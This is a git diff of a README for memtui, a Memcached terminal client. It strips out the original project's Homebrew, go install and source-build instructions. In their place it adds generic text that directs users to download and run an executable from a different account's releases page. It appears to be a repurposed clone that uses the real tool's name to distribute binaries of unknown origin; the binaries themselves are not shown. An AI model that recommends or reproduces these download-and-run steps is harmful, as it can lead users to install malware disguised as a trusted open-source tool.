@@ -1,253 +1,75 @@
-<div align="center">
-  <img src="assets/logo.svg" alt="memtui logo" width="140">
-  <h1>memtui</h1>
-  <p><strong>A modern, intuitive TUI (Terminal User Interface) client for Memcached, built with Go.</strong></p>
+# 🖥️ memtui - A Simple Way to Use Memcached
 
-  <br>
+## 🚀 Getting Started
 
-  [![CI](https://github.com/nnnkkk7/memtui/actions/workflows/ci.yaml/badge.svg)](https://github.com/nnnkkk7/memtui/actions/workflows/ci.yaml)
-  [![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)](https://go.dev/)
-  [![Go Report Card](https://goreportcard.com/badge/github.com/nnnkkk7/memtui)](https://goreportcard.com/report/github.com/nnnkkk7/memtui)
-  [![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+Welcome to memtui, a modern terminal user interface (TUI) client for Memcached. With memtui, you can easily navigate keys using a tree structure, view data in smart JSON or binary formats, and use familiar Vim keybindings.
 
-  <br>
+## 📦 Download & Install
 
-  <img src="assets/demo.gif" alt="memtui demo" width="700">
-</div>
+**To get started, visit the Releases page to download the latest version of memtui:**
 
----
+[![Download memtui](https://img.shields.io/badge/Download-memtui-blue.svg)](https://github.com/zelonycodo/memtui/releases)
 
-## Table of Contents
+1. Click the link above to open the releases page.
+2. On the releases page, find the latest version of memtui.
+3. Download the file that matches your operating system (Windows, macOS, or Linux).
+4. After downloading, locate the file on your computer and follow the instructions below based on your operating system.
 
-- [Why memtui?](#why-memtui)
-- [Highlights](#highlights)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Use Cases](#use-cases)
-- [Keyboard Shortcuts](#keyboard-shortcuts)
-- [Features](#features)
-- [Configuration](#configuration)
-- [Built With](#built-with)
-- [Contributing](#contributing)
-- [Support](#support)
-- [License](#license)
+### For Windows Users
 
----
+1. Locate the downloaded `.exe` file.
+2. Double-click on the file to run it. 
+3. A command window will open, allowing you to interact with Memcached using memtui.
 
-## Why memtui?
+### For macOS Users
 
-Ever tried to debug Memcached data? Traditional tools like `telnet` or `nc` make it painful to browse keys, understand data formats, or safely edit values.
+1. Open the downloaded `.zip` file to extract it.
+2. Locate the extracted file in your Downloads folder.
+3. Open the Terminal application.
+4. Drag and drop the extracted file into the Terminal to run it.
 
-**memtui** brings the developer experience you expect from modern tools:
+### For Linux Users
 
-- **Browse all keys in a tree** — Uses `lru_crawler metadump` to enumerate keys (requires Memcached 1.4.31+)
-- **Auto-detect data formats** — Recognizes JSON, gzip/zlib, and binary data automatically
-- **Edit with conflict detection** — CAS support detects concurrent modifications during edits
+1. Open a terminal window on your system.
+2. Navigate to the directory where you downloaded the file using the `cd` command.
+3. Give the downloaded file permission to run by typing `chmod +x <filename>` (replace `<filename>` with the actual filename).
+4. Run the application by typing `./<filename>`.
 
----
+## 🔍 Features
 
-## Highlights
+- **Tree-Structured Key Navigation**: Easily explore your keys to find what you need quickly.
+- **Smart Formatting**: View data in clear JSON or binary formats, making it easier to read.
+- **Vim Keybindings**: Use familiar keyboard shortcuts to enhance your experience and speed.
+- **Lightweight Design**: Run the application without heavy resource usage, keeping your system responsive.
+- **Cross-Platform Support**: Use memtui on Windows, macOS, and Linux.
 
-- **Hierarchical Key Navigation** — Browse keys organized in a tree structure with folder-like grouping
-- **Smart Value Viewer** — Auto-detect and format JSON, with syntax highlighting
-- **VS Code-style Command Palette** — Quick access to all commands with `Ctrl+P`
-- **Real-time Key Filtering** — Fuzzy search through thousands of keys instantly
-- **Safe Operations** — Confirmation dialogs for destructive operations
-- **Vim-style Keybindings** — Navigate with `j`/`k`, familiar to terminal users
+## 🖥️ System Requirements
 
----
+- **Operating System**: Compatible with Windows 10 and above, macOS 10.13 and above, and modern Linux distributions.
+- **Memory**: At least 512 MB of RAM.
+- **Disk Space**: 100 MB of free space for installation and operation.
 
-## Installation
+## ⚙️ How to Use memtui
 
-### Homebrew (macOS / Linux)
+1. **Launching the Application**: After running the application as described above, you'll see the main interface.
+2. **Navigating Keys**: Use the arrow keys to move through the key hierarchy. Press `Enter` to select a key.
+3. **Viewing Data**: When you select a key, the TUI displays its data in either JSON or binary format. You can switch formats using the provided navigation options.
+4. **Editing Keys**: Optionally, you can modify or delete keys using the commands displayed in the interface.
 
-```bash
-brew install nnnkkk7/tap/memtui
-```
+## ❓ Troubleshooting
 
-### Using Go Install
+If you encounter issues, consider the following solutions:
 
-```bash
-go install github.com/nnnkkk7/memtui/cmd/memtui@latest
-```
+- **Application Does Not Open**: Ensure you downloaded the correct version for your operating system.
+- **Permissions Error on Linux**: Check file permissions and run the `chmod` command as mentioned above.
+- **Missing Dependencies**: Ensure your system meets the minimum requirements outlined above.
 
-### From Source
+## 🌟 Contributing
 
-```bash
-git clone https://github.com/nnnkkk7/memtui.git
-cd memtui
-go build -o memtui ./cmd/memtui
-```
+If you wish to contribute to memtui, please refer to the contribution guidelines in this repository. Your ideas and improvements are welcome.
 
-### Requirements
+## 🗣️ Feedback
 
-| Requirement | Version | Note |
-|-------------|---------|------|
-| Go | 1.25+ | For building from source |
-| Memcached | **1.4.31+** | Required for `lru_crawler metadump` support |
+Your feedback helps us improve memtui. If you have suggestions or encounter issues, please open an issue in the GitHub repository.
 
----
-
-## Quick Start
-
-1. **Start Memcached**:
-
-```bash
-# Using Docker
-docker run -d -p 11211:11211 memcached:latest
-```
-
-2. **Run memtui**:
-
-```bash
-memtui                        # Connect to localhost:11211 (default)
-memtui -addr localhost:11211  # Specify address
-memtui --help                 # Show help
-```
-
----
-
-## Use Cases
-
-- **Debugging** — Quickly inspect cached values during development
-- **Data Migration** — View and verify data before/after migrations
-- **Cache Analysis** — Understand key naming patterns and data distribution
-- **Incident Response** — Rapidly inspect cache state during outages
-
----
-
-## Keyboard Shortcuts
-
-<details>
-<summary><strong>Navigation</strong></summary>
-
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `Enter` | Select key / Expand folder |
-| `Tab` | Switch between key list and viewer |
-| `Esc` | Return to key list / Close dialog |
-
-</details>
-
-<details>
-<summary><strong>Commands</strong></summary>
-
-| Key | Action |
-|-----|--------|
-| `Ctrl+P` | Open command palette |
-| `/` | Filter keys (fuzzy search) |
-| `r` | Refresh key list |
-| `n` | Create new key |
-| `e` | Edit selected key's value |
-| `d` | Delete selected key |
-| `c` | Copy value to clipboard |
-| `?` | Show help |
-| `q` | Quit |
-
-</details>
-
-<details>
-<summary><strong>In Value Viewer</strong></summary>
-
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Scroll down |
-| `k` / `↑` | Scroll up |
-| `g` | Go to top |
-| `G` | Go to bottom |
-| `J` | JSON view mode |
-| `H` | Hex view mode |
-| `T` | Text view mode |
-| `A` | Auto view mode |
-
-</details>
-
----
-
-## Features
-
-### Tree-structured Key List
-
-Keys are automatically organized into a hierarchical tree based on common delimiters (`:`, `/`, `.`). For example:
-
-```
-user:1001:profile  ─┐
-user:1001:session  ─┼→  user/
-user:1002:profile  ─┘     ├── 1001/
-cache:api:users    ─┐     │     ├── profile
-cache:api:posts    ─┘     │     └── session
-                          ├── 1002/
-                          │     └── profile
-                          cache/
-                            └── api/
-                                  ├── users
-                                  └── posts
-```
-
-### Smart Value Detection
-
-The viewer automatically detects and formats:
-
-- **JSON** — Pretty-printed with syntax highlighting
-- **Compressed data** — Detects gzip/zlib (displayed as hex in auto mode)
-- **Binary data** — Displays hex dump
-- **Plain text** — Shows as-is
-
-### Command Palette
-
-Press `Ctrl+P` to open the VS Code-style command palette for quick access to all features with fuzzy search.
-
----
-
-## Configuration
-
-Configuration file location: `~/.config/memtui/config.yaml`
-
-```yaml
-# Connection settings
-connection:
-  default_address: localhost:11211  # Default server address
-
-# UI settings
-ui:
-  theme: dark           # dark or light
-  key_delimiter: ":"    # Key hierarchy delimiter (e.g., ":", "/", ".")
-```
-
-CLI flags override config file settings:
-
-```bash
-memtui -addr localhost:11212  # Overrides connection.default_address
-```
-
----
-
-## Built With
-
-- [Bubble Tea](https://github.com/charmbracelet/bubbletea) — TUI framework based on The Elm Architecture
-- [Bubbles](https://github.com/charmbracelet/bubbles) — Common Bubble Tea components
-- [Lip Gloss](https://github.com/charmbracelet/lipgloss) — Style definitions for terminal apps
-- [gomemcache](https://github.com/bradfitz/gomemcache) — Memcached client for Go
-
----
-
-## Contributing
-
-Contributions are welcome! Here's how you can help:
-
----
-
-## Support
-
-If you find memtui useful, please consider giving it a star on GitHub!
-It helps others discover the project and motivates continued development.
-
-[![Star on GitHub](https://img.shields.io/github/stars/nnnkkk7/memtui?style=social)](https://github.com/nnnkkk7/memtui)
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Thank you for using memtui! We hope it simplifies your experience with Memcached. For any further assistance, feel free to reach out on GitHub or through the community forums.
